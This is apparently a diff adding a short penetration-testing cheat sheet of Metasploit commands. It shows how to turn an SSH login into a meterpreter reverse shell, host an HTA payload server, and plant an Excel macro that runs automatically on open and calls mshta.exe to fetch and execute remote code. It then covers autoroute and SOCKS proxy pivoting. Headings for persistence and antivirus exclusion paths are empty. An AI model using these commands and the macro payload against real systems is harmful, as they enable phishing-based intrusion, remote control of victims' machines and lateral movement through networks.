@@ -1,0 +1,48 @@
+# Cool Metasploit Modules
+
+# Convert an SSH connection to meterpreter
+msf > use auxiliary/scanner/ssh/ssh_login
+msf > set rhosts 192.168.0.109  
+msf > set username foo   
+msf > set password bar
+msf > set GatherProof true
+msf > set payload windows/x64/meterpreter_reverse_tcp
+msf > exploit
+msf > session –u 1
+
+# Persistence Exe
+
+
+# HTA Server
+> use exploit/windows/misc/hta_server
+> set SRVHOST 192.168.1.63    # Put listening IP here
+> run
+
+Create an excel (.xslm) with this macro:
+~~~~ Excel Macro ~~~~
+
+    Sub HelloWorld()
+        PID = Shell("mshta.exe https://192.168.1.63:8080/c9496fz.hta")
+    End Sub
+
+    Sub Auto_Open()
+        HelloWorld
+    End Sub
+~~~~~~~~~~~~~~~~~~~~~
+
+Wait for session..
+
+
+
+# AutoRoute
+> use autoroute
+> set SESSION <ID>
+> set SUBNET <ID>
+
+# Socks4a proxy
+> use socks4a
+> run
+
+# AV Exclusion Paths
+
+# Persistence EXE (Basic Persistence Technique)
